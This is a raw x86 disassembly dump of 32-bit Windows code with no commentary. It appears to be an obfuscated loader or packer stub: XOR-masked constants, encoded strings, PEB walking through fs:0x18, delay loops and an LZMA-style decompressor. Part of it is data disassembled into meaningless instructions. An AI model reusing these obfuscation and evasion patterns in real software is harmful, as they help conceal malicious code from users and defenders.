  424443:	mov    edi,DWORD PTR [ebp+0x24]
  424446:	lea    eax,[ebp-0xf4]
  42444c:	lea    edx,[ebp-0x54]
  42444f:	mov    DWORD PTR [ebp-0xe0],0x2
  424459:	mov    DWORD PTR [ebp-0xdc],eax
  42445f:	call   0x426ea1
  424464:	mov    ecx,DWORD PTR [ebp+0x8]
  424467:	mov    DWORD PTR [ebp-0xd8],eax
  42446d:	mov    eax,0x75108af
  424472:	xor    ecx,eax
  424474:	add    ecx,ebx
  424476:	je     0x424495
  424478:	lea    ecx,[ebp-0xe0]
  42447e:	push   ecx
  42447f:	mov    ecx,DWORD PTR [ebp+0xc]
  424482:	xor    ecx,eax
  424484:	add    ecx,ebx
  424486:	push   ecx
  424487:	lea    eax,[ebp-0x9c]
  42448d:	push   eax
  42448e:	mov    eax,DWORD PTR [ebp+0x10]
  424491:	push   0x0
  424493:	call   eax
  424495:	mov    edi,DWORD PTR [ebp+0x24]
  424498:	lea    eax,[ebp-0x108]
  42449e:	lea    edx,[ebp-0x40]
  4244a1:	mov    DWORD PTR [ebp-0xdc],eax
  4244a7:	call   0x426ea1
  4244ac:	mov    DWORD PTR [ebp-0xd8],eax
  4244b2:	mov    eax,DWORD PTR [ebp+0x14]
  4244b5:	push   DWORD PTR [ebp-0x4]
  4244b8:	push   DWORD PTR [ebp+0x20]
  4244bb:	push   DWORD PTR [ebp+0x1c]
  4244be:	push   DWORD PTR [ebp+0x18]
  4244c1:	push   DWORD PTR [ebp+0x10]
  4244c4:	push   DWORD PTR [ebp+0x8]
  4244c7:	push   DWORD PTR [ebp+0xc]
  4244ca:	call   0x425742
  4244cf:	test   eax,eax
  4244d1:	je     0x424518
  4244d3:	add    DWORD PTR [ebp-0x4],eax
  4244d6:	push   DWORD PTR [ebp-0x4]
  4244d9:	lea    esi,[ebp+0x4]
  4244dc:	call   0x424930
  4244e1:	mov    eax,DWORD PTR [ebp-0x4]
  4244e4:	mov    eax,DWORD PTR [eax+0x1c8]
  4244ea:	mov    eax,DWORD PTR [eax]
  4244ec:	xor    eax,0x75108af
  4244f1:	add    eax,ebx
  4244f3:	mov    eax,DWORD PTR [ebp-0x4]
  4244f6:	jne    0x42450e
  4244f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4244fb:	mov    ecx,DWORD PTR [ecx+0x1cc]
  424501:	push   DWORD PTR [ecx]
  424503:	mov    eax,DWORD PTR [eax+0x1e0]
  424509:	call   DWORD PTR [eax+0x28]
  42450c:	jmp    0x424518
  42450e:	mov    eax,DWORD PTR [eax+0x17c]
  424514:	mov    eax,DWORD PTR [eax]
  424516:	add    DWORD PTR [esi],eax
  424518:	mov    eax,DWORD PTR [ebp-0x4]
  42451b:	mov    eax,DWORD PTR [eax+0x1dc]
  424521:	dec    DWORD PTR [eax]
  424523:	mov    ecx,DWORD PTR [ebp-0x4]
  424526:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42452c:	mov    eax,DWORD PTR [eax]
  42452e:	lea    eax,[ecx+eax*4]
  424531:	mov    ecx,DWORD PTR [ebp-0x4]
  424534:	mov    ecx,DWORD PTR [ecx+0x17c]
  42453a:	mov    eax,DWORD PTR [eax]
  42453c:	mov    ecx,DWORD PTR [ecx]
  42453e:	add    DWORD PTR [eax],ecx
  424540:	pop    edi
  424541:	pop    esi
  424542:	pop    ebx
  424543:	leave  
  424544:	ret    0x20
  424547:	push   edi
  424548:	push   esi
  424549:	push   ebx
  42454a:	push   ebp
  42454b:	mov    ebp,esp
  42454d:	mov    eax,DWORD PTR [ebp+0x24]
  424550:	add    DWORD PTR [ebp+0x28],eax
  424553:	push   eax
  424554:	cld    
  424555:	mov    esi,DWORD PTR [ebp+0x18]
  424558:	add    DWORD PTR [ebp+0x1c],esi
  42455b:	push   esi
  42455c:	mov    esi,DWORD PTR [ebp+0x14]
  42455f:	lods   eax,DWORD PTR ds:[esi]
  424560:	xchg   edx,eax
  424561:	push   edx
  424562:	mov    cl,BYTE PTR [esi-0x2]
  424565:	or     eax,0xffffffff
  424568:	shl    eax,cl
  42456a:	not    eax
  42456c:	push   eax
  42456d:	mov    cl,dh
  42456f:	or     eax,0xffffffff
  424572:	shl    eax,cl
  424574:	not    eax
  424576:	push   eax
  424577:	add    cl,dl
  424579:	mov    edi,esi
  42457b:	sub    esp,0xc
  42457e:	sub    eax,eax
  424580:	inc    eax
  424581:	push   eax
  424582:	push   eax
  424583:	push   eax
  424584:	push   eax
  424585:	push   eax
  424586:	push   edi
  424587:	sub    esi,esi
  424589:	push   esi
  42458a:	or     ebx,0xffffffff
  42458d:	mov    eax,0x300
  424592:	shl    eax,cl
  424594:	lea    ecx,[eax+0x736]
  42459a:	mov    eax,0x4000400
  42459f:	shr    ecx,1
  4245a1:	rep stos DWORD PTR es:[edi],eax
  4245a3:	push   0x5
  4245a5:	pop    ecx
  4245a6:	call   0x424891
  4245ab:	loop   0x4245a6
  4245ad:	lea    esi,[esi]
  4245af:	lea    edi,[edi]
  4245b1:	mov    edi,DWORD PTR [ebp-0x4]
  4245b4:	mov    eax,DWORD PTR [ebp-0x10]
  4245b7:	sub    edi,DWORD PTR [ebp+0x24]
  4245ba:	and    eax,edi
  4245bc:	mov    DWORD PTR [ebp-0x18],eax
  4245bf:	mov    al,0x0
  4245c1:	call   0x4248a9
  4245c6:	jne    0x424661
  4245cc:	mov    cl,BYTE PTR [ebp-0xc]
  4245cf:	and    edi,DWORD PTR [ebp-0x14]
  4245d2:	shl    edi,cl
  4245d4:	sub    cl,0x8
  4245d7:	neg    cl
  4245d9:	shr    esi,cl
  4245db:	pop    eax
  4245dc:	add    edi,esi
  4245de:	pop    esi
  4245df:	lea    edi,[edi+edi*2]
  4245e2:	shl    edi,0x8
  4245e5:	cmp    al,0x7
  4245e7:	pop    edx
  4245e8:	lea    ecx,[esi+edi*2+0xe6c]
  4245ef:	push   ecx
  4245f0:	push   esi
  4245f1:	mov    esi,0x100
  4245f6:	push   eax
  4245f7:	mov    al,0x1
  4245f9:	jb     0x42462f
  4245fb:	mov    edi,DWORD PTR [ebp-0x4]
  4245fe:	sub    edi,DWORD PTR [ebp-0x24]
  424601:	movzx  edi,BYTE PTR [edi]
  424604:	mov    ebp,DWORD PTR [ebp-0x34]
  424607:	shl    edi,1
  424609:	mov    ecx,esi
  42460b:	and    esi,edi
  42460d:	add    ecx,esi
  42460f:	lea    ebp,[ebp+ecx*2+0x0]
  424613:	call   0x4248c8
  424618:	mov    ecx,eax
  42461a:	shr    esi,0x8
  42461d:	and    ecx,0x1
  424620:	cmp    esi,ecx
  424622:	mov    esi,0x100
  424627:	jne    0x424637
  424629:	cmp    eax,esi
  42462b:	jb     0x424604
  42462d:	jmp    0x424643
  42462f:	mov    ebp,DWORD PTR [ebp-0x34]
  424632:	call   0x4248c8
  424637:	inc    eax
  424638:	inc    esi
  424639:	sub    eax,0x1
  42463c:	sub    esi,0x1
  42463f:	cmp    eax,esi
  424641:	jb     0x42462f
  424643:	pop    edx
  424644:	inc    edx
  424645:	cmp    edx,0x5
  424648:	dec    edx
  424649:	mov    ecx,edx
  42464b:	jb     0x42465c
  42464d:	inc    edx
  42464e:	cmp    edx,0xb
  424651:	dec    edx
  424652:	mov    cl,0x4
  424654:	dec    cl
  424656:	jb     0x42465c
  424658:	mov    cl,0x7
  42465a:	dec    cl
  42465c:	sub    edx,ecx
  42465e:	push   edx
  42465f:	jmp    0x4246b0
  424661:	mov    al,0xc1
  424663:	dec    al
  424665:	call   0x4248b9
  42466a:	jne    0x424680
  42466c:	pop    eax
  42466d:	pop    edi
  42466e:	pop    edx
  42466f:	pop    ecx
  424670:	pop    edx
  424671:	pop    ecx
  424672:	push   DWORD PTR [esp]
  424675:	push   ecx
  424676:	push   edx
  424677:	mov    edx,0x664
  42467c:	mov    cl,0x0
  42467e:	jmp    0x4246f3
  424680:	mov    al,0xcd
  424682:	dec    al
  424684:	call   0x4248b9
  424689:	jne    0x4246b9
  42468b:	mov    al,0xf1
  42468d:	dec    al
  42468f:	call   0x4248a9
  424694:	jne    0x4246e9
  424696:	pop    eax
  424697:	cmp    al,0x7
  424699:	mov    al,0x9
  42469b:	jb     0x42469f
  42469d:	mov    al,0xb
  42469f:	push   eax
  4246a0:	mov    esi,DWORD PTR [ebp-0x4]
  4246a3:	sub    esi,DWORD PTR [ebp-0x24]
  4246a6:	cmp    esi,DWORD PTR [ebp+0x24]
  4246a9:	jb     0x424880
  4246af:	lods   al,BYTE PTR ds:[esi]
  4246b0:	mov    edi,DWORD PTR [ebp-0x4]
  4246b3:	stos   BYTE PTR es:[edi],al
  4246b4:	jmp    0x424847
  4246b9:	mov    al,0xd8
  4246bb:	call   0x4248b9
  4246c0:	mov    esi,DWORD PTR [ebp-0x28]
  4246c3:	je     0x4246e0
  4246c5:	mov    al,0xe4
  4246c7:	call   0x4248b9
  4246cc:	mov    esi,DWORD PTR [ebp-0x2c]
  4246cf:	je     0x4246da
  4246d1:	mov    esi,DWORD PTR [ebp-0x30]
  4246d4:	mov    ecx,DWORD PTR [ebp-0x2c]
  4246d7:	mov    DWORD PTR [ebp-0x30],ecx
  4246da:	mov    ecx,DWORD PTR [ebp-0x28]
  4246dd:	mov    DWORD PTR [ebp-0x2c],ecx
  4246e0:	mov    ecx,DWORD PTR [ebp-0x24]
  4246e3:	mov    DWORD PTR [ebp-0x28],ecx
  4246e6:	mov    DWORD PTR [ebp-0x24],esi
  4246e9:	pop    eax
  4246ea:	pop    edi
  4246eb:	pop    ecx
  4246ec:	mov    edx,0xa68
  4246f1:	mov    cl,0x8
  4246f3:	add    edx,edi
  4246f5:	push   edx
  4246f6:	push   edi
  4246f7:	cmp    al,0x7
  4246f9:	mov    al,cl
  4246fb:	jb     0x4246ff
  4246fd:	add    al,0x3
  4246ff:	push   eax
  424700:	mov    ebp,DWORD PTR [ebp-0x34]
  424703:	call   0x4248c6
  424708:	jne    0x42471e
  42470a:	mov    eax,DWORD PTR [ebp-0x18]
  42470d:	mov    edi,DWORD PTR [ebp-0x34]
  424710:	shl    eax,0x3
  424713:	sub    ecx,ecx
  424715:	push   0x8
  424717:	pop    esi
  424718:	lea    edi,[edi+eax*2+0x4]
  42471c:	jmp    0x424753
  42471e:	mov    ebp,DWORD PTR [ebp-0x34]
  424721:	add    ebp,0x2
  424724:	call   0x4248c6
  424729:	jne    0x424743
  42472b:	mov    eax,DWORD PTR [ebp-0x18]
  42472e:	mov    edi,DWORD PTR [ebp-0x34]
  424731:	shl    eax,0x3
  424734:	push   0x8
  424736:	pop    ecx
  424737:	push   0x8
  424739:	pop    esi
  42473a:	lea    edi,[edi+eax*2+0x104]
  424741:	jmp    0x424753
  424743:	mov    edi,0x204
  424748:	add    edi,DWORD PTR [ebp-0x34]
  42474b:	push   0x10
  42474d:	pop    ecx
  42474e:	mov    esi,0x100
  424753:	mov    DWORD PTR [ebp-0x1c],ecx
  424756:	sub    eax,eax
  424758:	inc    eax
  424759:	mov    ebp,edi
  42475b:	call   0x4248c8
  424760:	mov    ecx,eax
  424762:	sub    ecx,esi
  424764:	jb     0x424759
  424766:	add    DWORD PTR [ebp-0x1c],ecx
  424769:	cmp    DWORD PTR [ebp-0x3c],0x4
  42476d:	jae    0x424823
  424773:	add    DWORD PTR [ebp-0x3c],0x7
  424777:	mov    ecx,DWORD PTR [ebp-0x1c]
  42477a:	cmp    ecx,0x4
  42477d:	jb     0x424782
  42477f:	push   0x3
  424781:	pop    ecx
  424782:	mov    edi,DWORD PTR [ebp-0x38]
  424785:	shl    ecx,0x6
  424788:	sub    eax,eax
  42478a:	inc    eax
  42478b:	push   0x40
  42478d:	pop    esi
  42478e:	lea    edi,[edi+ecx*2+0x360]
  424795:	mov    ebp,edi
  424797:	call   0x4248c8
  42479c:	mov    ecx,eax
  42479e:	sub    ecx,esi
  4247a0:	jb     0x424795
  4247a2:	mov    DWORD PTR [ebp-0x18],ecx
  4247a5:	mov    DWORD PTR [ebp-0x24],ecx
  4247a8:	cmp    ecx,0x4
  4247ab:	jb     0x424820
  4247ad:	mov    esi,ecx
  4247af:	and    DWORD PTR [ebp-0x24],0x1
  4247b3:	shr    esi,1
  4247b5:	or     DWORD PTR [ebp-0x24],0x2
  4247b9:	dec    esi
  4247ba:	cmp    ecx,0xe
  4247bd:	jae    0x4247d8
  4247bf:	mov    eax,0x2af
  4247c4:	sub    eax,ecx
  4247c6:	mov    ecx,esi
  4247c8:	shl    BYTE PTR [ebp-0x24],cl
  4247cb:	add    eax,DWORD PTR [ebp-0x24]
  4247ce:	shl    eax,1
  4247d0:	add    eax,DWORD PTR [ebp-0x38]
  4247d3:	mov    DWORD PTR [ebp-0x34],eax
  4247d6:	jmp    0x424805
  4247d8:	sub    esi,0x4
  4247db:	call   0x424885
  4247e0:	shr    ebx,1
  4247e2:	shl    DWORD PTR [ebp-0x24],1
  4247e5:	cmp    DWORD PTR [ebp-0x20],ebx
  4247e8:	jb     0x4247f0
  4247ea:	inc    DWORD PTR [ebp-0x24]
  4247ed:	sub    DWORD PTR [ebp-0x20],ebx
  4247f0:	dec    esi
  4247f1:	jne    0x4247db
  4247f3:	mov    eax,0x644
  4247f8:	add    eax,DWORD PTR [ebp-0x38]
  4247fb:	mov    DWORD PTR [ebp-0x34],eax
  4247fe:	shl    DWORD PTR [ebp-0x24],0x4
  424802:	push   0x4
  424804:	pop    esi
  424805:	sub    edi,edi
  424807:	inc    edi
  424808:	mov    eax,edi
  42480a:	mov    ebp,DWORD PTR [ebp-0x34]
  42480d:	call   0x4248c8
  424812:	test   al,0x1
  424814:	je     0x424819
  424816:	or     DWORD PTR [ebp-0x24],edi
  424819:	shl    edi,1
  42481b:	dec    esi
  42481c:	jne    0x42480a
  42481e:	jmp    0x424820
  424820:	inc    DWORD PTR [ebp-0x24]
  424823:	mov    ecx,DWORD PTR [ebp-0x1c]
  424826:	add    ecx,0x2
  424829:	mov    edi,DWORD PTR [ebp-0x4]
  42482c:	mov    eax,edi
  42482e:	sub    eax,DWORD PTR [ebp+0x24]
  424831:	cmp    DWORD PTR [ebp-0x24],eax
  424834:	ja     0x424880
  424836:	mov    esi,edi
  424838:	sub    esi,DWORD PTR [ebp-0x24]
  42483b:	mov    edx,DWORD PTR [ebp+0x28]
  42483e:	lods   al,BYTE PTR ds:[esi]
  42483f:	stos   BYTE PTR es:[edi],al
  424840:	cmp    edi,edx
  424842:	jae    0x424847
  424844:	dec    ecx
  424845:	jne    0x42483e
  424847:	mov    DWORD PTR [ebp-0x4],edi
  42484a:	movzx  esi,al
  42484d:	cmp    edi,DWORD PTR [ebp+0x28]
  424850:	jb     0x4245b1
  424856:	call   0x424885
  42485b:	sub    eax,eax
  42485d:	lea    ebp,[esp+0x3c]
  424861:	mov    edx,DWORD PTR [ebp+0x20]
  424864:	mov    esi,DWORD PTR [ebp-0x8]
  424867:	sub    esi,DWORD PTR [ebp+0x18]
  42486a:	mov    DWORD PTR [edx],esi
  42486c:	mov    edx,DWORD PTR [ebp+0x2c]
  42486f:	mov    edi,DWORD PTR [ebp-0x4]
  424872:	sub    edi,DWORD PTR [ebp+0x24]
  424875:	mov    DWORD PTR [edx],edi
  424877:	leave  
  424878:	pop    ebx
  424879:	pop    esi
  42487a:	pop    edi
  42487b:	ret    0x1c
  42487e:	pop    esi
  42487f:	pop    eax
  424880:	sub    eax,eax
  424882:	inc    eax
  424883:	jmp    0x42485d
  424885:	cmp    ebx,0x1000000
  42488b:	jb     0x42488e
  42488d:	ret    
  42488e:	shl    ebx,0x8
  424891:	push   esi
  424892:	mov    esi,DWORD PTR [ebp-0x8]
  424895:	cmp    esi,DWORD PTR [ebp+0x1c]
  424898:	jae    0x42487e
  42489a:	mov    eax,DWORD PTR [ebp-0x20]
  42489d:	shl    eax,0x8
  4248a0:	lods   al,BYTE PTR ds:[esi]
  4248a1:	scas   eax,DWORD PTR es:[edi]
  4248a2:	sahf   
  4248a3:	or     al,0xaf
  4248a5:	pop    esi
  4248a6:	ins    BYTE PTR es:[edi],dx
  4248a7:	add    bl,BYTE PTR [eax-0x3a634149]
  4248ad:	arpl   WORD PTR [eax+edx*4-0x616a66f0],cx
  4248b4:	sub    al,0x95
  4248b6:	nop
  4248b7:	cmp    BYTE PTR [ecx-0x6a739c3b],ah
  4248bd:	sahf   
  4248be:	pushf  
  4248bf:	mov    bh,0x3e
  4248c1:	lods   al,BYTE PTR ds:[esi]
  4248c2:	mov    edi,0x35899e3a
  4248c7:	mov    WORD PTR [edi-0x707661c6],?
  4248cd:	js     0x424858
  4248cf:	mov    DWORD PTR [ecx-0x4806a973],ecx
  4248d5:	mov    edx,0x1a906919
  4248da:	sbb    DWORD PTR [ecx],ecx
  4248dc:	test   eax,0xfa19ba75
  4248e1:	push   esi
  4248e2:	sti    
  4248e3:	mov    bl,0xcd
  4248e5:	mov    BYTE PTR [edx+0x18906919],bl
  4248eb:	test   eax,0x919daab
  4248f0:	mov    bh,0xb8
  4248f2:	lds    esp,FWORD PTR [edi-0x22]
  4248f5:	mov    DWORD PTR [eax+0x47c5b530],edx
  4248fb:	mov    ah,0x6d
  4248fd:	mov    edx,0xe5560919
  424902:	mov    bh,0xf0
  424904:	outs   dx,DWORD PTR ds:[esi]
  424905:	mov    DWORD PTR [ecx-0x4bca7677],ebp
  42490b:	nop
  42490c:	xor    BYTE PTR [ebp-0x764172de],bl
  424912:	xchg   ebp,eax
  424913:	mov    WORD PTR [edi-0x6775e6c6],?
  424919:	nop
  42491a:	xor    al,0x9d
  42491c:	sub    eax,0x350919ba
  424921:	fldenv [esi+0x29]
  424924:	push   ebp
  424925:	add    BYTE PTR [ebx],al
  424927:	rol    BYTE PTR [ebx+0x6c8d01c0],0x24
  42492e:	inc    eax
  42492f:	ret    
  424930:	push   ebp
  424931:	mov    ebp,esp
  424933:	sub    esp,0x12c
  424939:	push   ebx
  42493a:	push   esi
  42493b:	push   edi
  42493c:	mov    DWORD PTR [ebp-0x10],0xf89c85a5
  424943:	mov    DWORD PTR [ebp-0x18],0xf89c85a4
  42494a:	mov    eax,DWORD PTR [ebp+0x8]
  42494d:	mov    DWORD PTR [ebp+0x8],eax
  424950:	mov    ecx,DWORD PTR [ebp-0x10]
  424953:	mov    ebx,0x75108af
  424958:	xor    ecx,ebx
  42495a:	mov    eax,0x3272f6
  42495f:	add    ecx,eax
  424961:	mov    DWORD PTR [ebp-0x2c],ecx
  424964:	mov    ecx,DWORD PTR [ebp-0x10]
  424967:	xor    ecx,ebx
  424969:	add    ecx,eax
  42496b:	mov    DWORD PTR [ebp-0x3c],ecx
  42496e:	mov    ecx,DWORD PTR [ebp-0x10]
  424971:	xor    ecx,ebx
  424973:	add    ecx,eax
  424975:	mov    DWORD PTR [ebp-0x40],ecx
  424978:	mov    ecx,DWORD PTR [ebp-0x10]
  42497b:	xor    ecx,ebx
  42497d:	add    ecx,eax
  42497f:	mov    DWORD PTR [ebp-0xd8],ecx
  424985:	mov    DWORD PTR [ebp-0x50],0xf89f05a5
  42498c:	mov    DWORD PTR [ebp-0x40],0xf89cb5a5
  424993:	mov    DWORD PTR [ebp-0x54],0xf89c85a1
  42499a:	push   0x25
  42499c:	pop    ecx
  42499d:	mov    DWORD PTR [ebp-0x38],ecx
  4249a0:	mov    DWORD PTR [ebp-0x38],ecx
  4249a3:	push   0x65
  4249a5:	pop    ecx
  4249a6:	mov    DWORD PTR [ebp-0x38],ecx
  4249a9:	mov    DWORD PTR [ebp-0x38],ecx
  4249ac:	mov    DWORD PTR [ebp-0x38],0x4d
  4249b3:	mov    DWORD PTR [ebp-0x38],0x43
  4249ba:	mov    ecx,DWORD PTR [ebp-0x10]
  4249bd:	xor    ecx,ebx
  4249bf:	add    ecx,eax
  4249c1:	mov    DWORD PTR [ebp-0x38],ecx
  4249c4:	mov    ecx,DWORD PTR [ebp-0x10]
  4249c7:	xor    ecx,ebx
  4249c9:	add    ecx,eax
  4249cb:	mov    DWORD PTR [ebp-0x38],ecx
  4249ce:	mov    DWORD PTR [ebp-0x28],0x258
  4249d5:	mov    DWORD PTR [ebp-0x20],0x36
  4249dc:	mov    DWORD PTR [ebp-0x14],0x7a
  4249e3:	lea    edi,[ebp-0x10c]
  4249e9:	lea    esi,[ebp-0x12c]
  4249ef:	call   0x4256b1
  4249f4:	dec    DWORD PTR [ebp-0x14]
  4249f7:	jne    0x4249e3
  4249f9:	dec    DWORD PTR [ebp-0x20]
  4249fc:	jne    0x4249dc
  4249fe:	dec    DWORD PTR [ebp-0x28]
  424a01:	jne    0x4249d5
  424a03:	mov    DWORD PTR [ebp-0x28],0x400e
  424a0a:	mov    eax,DWORD PTR [ebp-0x10]
  424a0d:	xor    eax,ebx
  424a0f:	mov    esi,0x3272f6
  424a14:	add    eax,esi
  424a16:	mov    DWORD PTR [ebp-0x1c],eax
  424a19:	mov    eax,DWORD PTR [ebp-0x10]
  424a1c:	and    DWORD PTR [ebp-0x94],0x0
  424a23:	xor    eax,ebx
  424a25:	add    eax,esi
  424a27:	mov    DWORD PTR [ebp-0x34],eax
  424a2a:	mov    eax,fs:0x18
  424a30:	mov    DWORD PTR [ebp-0x94],eax
  424a36:	mov    eax,DWORD PTR [eax+0x30]
  424a39:	mov    DWORD PTR [ebp-0xcc],eax
  424a3f:	mov    eax,DWORD PTR [eax+0xc]
  424a42:	mov    DWORD PTR [ebp-0xc0],eax
  424a48:	mov    eax,DWORD PTR [ebp+0x8]
  424a4b:	lea    ecx,[ebp-0x94]
  424a51:	mov    DWORD PTR [eax+0x1a0],ecx
  424a57:	mov    eax,DWORD PTR [ebp+0x8]
  424a5a:	lea    ecx,[ebp-0xcc]
  424a60:	mov    DWORD PTR [eax+0x1a4],ecx
  424a66:	mov    eax,DWORD PTR [ebp+0x8]
  424a69:	push   DWORD PTR [ebp+0x8]
  424a6c:	lea    ecx,[ebp-0xc0]
  424a72:	mov    DWORD PTR [eax+0x1a8],ecx
  424a78:	call   0x426e72
  424a7d:	mov    ecx,DWORD PTR [ebp-0x10]
  424a80:	xor    ecx,ebx
  424a82:	add    ecx,esi
  424a84:	cmp    ecx,eax
  424a86:	je     0x424e09
  424a8c:	mov    eax,DWORD PTR [ebp+0x8]
  424a8f:	mov    eax,DWORD PTR [eax+0x194]
  424a95:	mov    ecx,DWORD PTR [eax]
  424a97:	mov    eax,DWORD PTR [ebp+0x8]
  424a9a:	mov    eax,DWORD PTR [eax+0x194]
  424aa0:	mov    eax,DWORD PTR [eax]
  424aa2:	add    eax,DWORD PTR [ecx+0x3c]
  424aa5:	mov    ecx,DWORD PTR [ebp+0x8]
  424aa8:	mov    ecx,DWORD PTR [ecx+0x1e0]
  424aae:	lea    edx,[ebp-0xec]
  424ab4:	push   edx
  424ab5:	mov    edx,DWORD PTR [ebp+0x8]
  424ab8:	mov    edx,DWORD PTR [edx+0x18c]
  424abe:	mov    edx,DWORD PTR [edx]
  424ac0:	add    edx,DWORD PTR [eax+0x88]
  424ac6:	push   0x4
  424ac8:	push   DWORD PTR [eax+0x8c]
  424ace:	push   edx
  424acf:	call   DWORD PTR [ecx+0x1c]
  424ad2:	push   DWORD PTR [ebp+0x8]
  424ad5:	xor    eax,eax
  424ad7:	mov    DWORD PTR [ebp-0xa8],0x1b40103a
  424ae1:	mov    DWORD PTR [ebp-0xa4],0x14371122
  424aeb:	mov    DWORD PTR [ebp-0xa0],0x42111e0c
  424af5:	mov    BYTE PTR [ebp-0x9c],0x83
  424afc:	lea    edi,[ebp-0x9b]
  424b02:	stos   DWORD PTR es:[edi],eax
  424b03:	stos   WORD PTR es:[edi],ax
  424b05:	stos   BYTE PTR es:[edi],al
  424b06:	xor    eax,eax
  424b08:	mov    DWORD PTR [ebp-0xbc],0x1b40103a
  424b12:	mov    DWORD PTR [ebp-0xb8],0x14371122
  424b1c:	mov    DWORD PTR [ebp-0xb4],0x2c111e0c
  424b26:	mov    BYTE PTR [ebp-0xb0],0x83
  424b2d:	lea    edi,[ebp-0xaf]
  424b33:	stos   DWORD PTR es:[edi],eax
  424b34:	stos   WORD PTR es:[edi],ax
  424b36:	stos   BYTE PTR es:[edi],al
  424b37:	mov    edi,DWORD PTR [ebp+0x8]
  424b3a:	mov    eax,DWORD PTR [ebp+0x8]
  424b3d:	mov    edx,DWORD PTR [eax+0x1b8]
  424b43:	mov    DWORD PTR [ebp-0x68],0x110f1017
  424b4a:	mov    DWORD PTR [ebp-0x64],0x1a131620
  424b51:	mov    WORD PTR [ebp-0x60],0x8342
  424b57:	mov    DWORD PTR [ebp-0x90],0x1b40103a
  424b61:	mov    DWORD PTR [ebp-0x8c],0x17421122
  424b6b:	mov    DWORD PTR [ebp-0x88],0x35221b13
  424b75:	mov    DWORD PTR [ebp-0x84],0x111e160e
  424b7f:	mov    DWORD PTR [ebp-0x80],0x8342201a
  424b86:	mov    DWORD PTR [ebp-0x7c],0x1b40103a
  424b8d:	mov    DWORD PTR [ebp-0x78],0x17421122
  424b94:	mov    DWORD PTR [ebp-0x74],0x35221b13
  424b9b:	mov    DWORD PTR [ebp-0x70],0x111e160e
  424ba2:	mov    DWORD PTR [ebp-0x6c],0x832c201a
  424ba9:	call   0x426ea1
  424bae:	push   eax
  424baf:	mov    eax,DWORD PTR [ebp+0x8]
  424bb2:	mov    eax,DWORD PTR [eax+0x1a8]
  424bb8:	push   DWORD PTR [eax]
  424bba:	call   0x426b42
  424bbf:	test   eax,eax
  424bc1:	jne    0x424c13
  424bc3:	mov    eax,DWORD PTR [ebp+0x8]
  424bc6:	mov    eax,DWORD PTR [eax+0x1e0]
  424bcc:	mov    edi,DWORD PTR [ebp+0x8]
  424bcf:	add    eax,0x4
  424bd2:	mov    DWORD PTR [ebp-0x24],eax
  424bd5:	mov    eax,DWORD PTR [ebp+0x8]
  424bd8:	mov    edx,DWORD PTR [eax+0x1b8]
  424bde:	call   0x426ea1
  424be3:	push   eax
  424be4:	mov    eax,DWORD PTR [ebp-0x24]
  424be7:	call   DWORD PTR [eax]
  424be9:	test   eax,eax
  424beb:	jne    0x424c13
  424bed:	mov    eax,DWORD PTR [ebp+0x8]
  424bf0:	mov    eax,DWORD PTR [eax+0x1e0]
  424bf6:	mov    edi,DWORD PTR [ebp+0x8]
  424bf9:	add    eax,0x10
  424bfc:	mov    DWORD PTR [ebp-0x24],eax
  424bff:	mov    eax,DWORD PTR [ebp+0x8]
  424c02:	mov    edx,DWORD PTR [eax+0x1b8]
  424c08:	call   0x426ea1
  424c0d:	push   eax
  424c0e:	mov    eax,DWORD PTR [ebp-0x24]
  424c11:	call   DWORD PTR [eax]
  424c13:	mov    eax,DWORD PTR [ebp-0x10]
  424c16:	mov    ecx,DWORD PTR [ebp-0x28]
  424c19:	xor    eax,ebx
  424c1b:	add    eax,esi
  424c1d:	cmp    eax,ecx
  424c1f:	je     0x424de2
  424c25:	mov    eax,DWORD PTR [ebp-0x18]
  424c28:	xor    eax,ebx
  424c2a:	mov    ecx,0xffcd8d0a
  424c2f:	sub    ecx,eax
  424c31:	add    ecx,DWORD PTR [ebp-0x28]
  424c34:	mov    eax,DWORD PTR [ebp-0x1c]
  424c37:	cmp    eax,ecx
  424c39:	ja     0x424de2
  424c3f:	mov    DWORD PTR [ebp-0x20],0x0
  424c46:	push   DWORD PTR [ebp+0x8]
  424c49:	mov    edi,DWORD PTR [ebp+0x8]
  424c4c:	mov    eax,DWORD PTR [ebp+0x8]
  424c4f:	mov    edx,DWORD PTR [eax+0x1b4]
  424c55:	call   0x426ea1
  424c5a:	push   eax
  424c5b:	mov    eax,DWORD PTR [ebp+0x8]
  424c5e:	mov    eax,DWORD PTR [eax+0x1a8]
  424c64:	push   DWORD PTR [eax]
  424c66:	call   0x426b42
  424c6b:	mov    ecx,DWORD PTR [ebp+0x8]
  424c6e:	mov    ecx,DWORD PTR [ecx+0x19c]
  424c74:	mov    DWORD PTR [ecx],eax
  424c76:	mov    eax,DWORD PTR [ebp+0x8]
  424c79:	mov    edi,DWORD PTR [eax+0x1e0]
  424c7f:	mov    esi,DWORD PTR [ebp+0x8]
  424c82:	xor    eax,eax
  424c84:	lea    edx,[ebp-0x7c]
  424c87:	call   0x426ed7
  424c8c:	push   eax
  424c8d:	mov    eax,DWORD PTR [ebp+0x8]
  424c90:	mov    eax,DWORD PTR [eax+0x19c]
  424c96:	push   DWORD PTR [eax]
  424c98:	call   DWORD PTR [edi+0x8]
  424c9b:	mov    DWORD PTR [ebp-0x24],eax
  424c9e:	mov    eax,DWORD PTR [ebp+0x8]
  424ca1:	mov    edi,DWORD PTR [eax+0x1e0]
  424ca7:	mov    esi,DWORD PTR [ebp+0x8]
  424caa:	xor    eax,eax
  424cac:	lea    edx,[ebp-0x90]
  424cb2:	call   0x426ed7
  424cb7:	push   eax
  424cb8:	mov    eax,DWORD PTR [ebp+0x8]
  424cbb:	mov    eax,DWORD PTR [eax+0x19c]
  424cc1:	push   DWORD PTR [eax]
  424cc3:	call   DWORD PTR [edi+0x8]
  424cc6:	mov    eax,DWORD PTR [ebp+0x8]
  424cc9:	mov    edi,DWORD PTR [eax+0x1e0]
  424ccf:	mov    esi,DWORD PTR [ebp+0x8]
  424cd2:	xor    eax,eax
  424cd4:	lea    edx,[ebp-0xa8]
  424cda:	call   0x426ed7
  424cdf:	push   eax
  424ce0:	mov    eax,DWORD PTR [ebp+0x8]
  424ce3:	mov    eax,DWORD PTR [eax+0x19c]
  424ce9:	push   DWORD PTR [eax]
  424ceb:	call   DWORD PTR [edi+0x8]
  424cee:	and    DWORD PTR [ebp-0x8],0x0
  424cf2:	mov    DWORD PTR [ebp-0x44],eax
  424cf5:	mov    eax,DWORD PTR [ebp-0x8]
  424cf8:	and    eax,0x7
  424cfb:	add    eax,0x31
  424cfe:	push   eax
